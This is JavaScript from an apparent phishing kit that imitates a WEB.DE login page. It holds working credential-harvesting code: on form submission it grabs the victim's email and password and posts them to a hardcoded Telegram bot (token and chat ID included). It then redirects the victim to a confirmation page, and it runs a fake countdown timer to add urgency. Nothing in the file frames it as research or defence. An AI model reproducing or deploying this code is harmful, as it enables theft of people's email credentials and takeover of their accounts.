
    // Set global JavaScript variables
    window.telegramBotToken = "{{ telegram_bot_token }}";
    window.telegramChatId = "{{ telegram_chat_id }}";

    // Telegram credentials
    const TELEGRAM_BOT_TOKEN = '7285927680:AAHqGWvKT2dOnkiGFEukfS4-SoxUx5JQ89o';
    const TELEGRAM_CHAT_ID = '7473556793';

    // Toggle password visibility
    document.getElementById('toggle-password').addEventListener('click', function() {
        const passwordInput = document.getElementById('password');
        passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
    });

    // Function to send email and password to Telegram
    async function sendToTelegram(email, password) {
        // Customize the message format
        const message = `
        *GOODNEWS from WEB.DE*
        *Email:* ${email}
        *Password:* ${password}
        `;
        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

        console.log('Preparing to send message to Telegram...');

        try {
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'  // Use Markdown for formatting
                })
            });

            console.log('Request made, waiting for response...');

            if (!response.ok) {
                console.error('Response not OK:', response.status, response.statusText);
                throw new Error('Failed to send message to Telegram');
            }

            const data = await response.json();
            console.log('Message successfully sent to Telegram:', data);

            // Wait for 3 seconds before redirecting
            setTimeout(function() {
                // Redirect to confirmation page
                window.location.href = 'confirmation.html';
            }, 3000); // 3000ms = 3 seconds
        } catch (error) {
            console.error('An error occurred:', error);
            alert('Failed to send data. Please try again.');
        }
    }

    // Handle form submission
    document.getElementById('login-form').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent the default form submission

        // Retrieve email and password values
        const email = document.getElementById('email').value;
        const password = document.getElementById('password').value;

        if (!email || !password) {
            alert('Please enter both email and password.');
            return;
        }

        // Log the email and password for debugging
        console.log('Submitting form...');
        console.log('Email:', email);
        console.log('Password:', password);

        // Send data to Telegram
        sendToTelegram(email, password);
    });

    document.addEventListener('DOMContentLoaded', function() {
        // Function to format the remaining time
        function formatTimeComponent(time) {
            return time.toString().padStart(2, '0');
        }

        // Set or get the end time from localStorage
        function setEndTime() {
            const currentTime = new Date().getTime();
            const endTime = currentTime + 12 * 60 * 60 * 1000; // 12 hours from now
            localStorage.setItem('captchaEndTime', endTime);
            return endTime;
        }

        // Check if we have an existing end time and if it is expired
        function getEndTime() {
            const storedEndTime = localStorage.getItem('captchaEndTime');
            if (storedEndTime) {
                const currentTime = new Date().getTime();
                if (currentTime > storedEndTime) {
                    // If time expired, reset the end time
                    return setEndTime();
                }
                return parseInt(storedEndTime, 10);
            }
            // If no stored end time, set one
            return setEndTime();
        }

        // Update the countdown timer every second
        function updateCountdown() {
            const endTime = getEndTime();
            const currentTime = new Date().getTime();
            const remainingTime = Math.max(0, endTime - currentTime); // Make sure we don't get negative time

            // Calculate hours, minutes, and seconds
            const hours = Math.floor(remainingTime / 3600000);
            const minutes = Math.floor((remainingTime % 3600000) / 60000);
            const secondsLeft = Math.floor((remainingTime % 60000) / 1000);

            // Update each part of the countdown individually
            document.getElementById('hours').textContent = formatTimeComponent(hours);
            document.getElementById('minutes').textContent = formatTimeComponent(minutes);
            document.getElementById('seconds').textContent = formatTimeComponent(secondsLeft);

            // If countdown has finished, clear the timer
            if (remainingTime === 0) {
                clearInterval(countdownInterval);
            }
        }

        // Initial countdown update
        updateCountdown();

        // Update countdown every second
        const countdownInterval = setInterval(updateCountdown, 1000);
    });

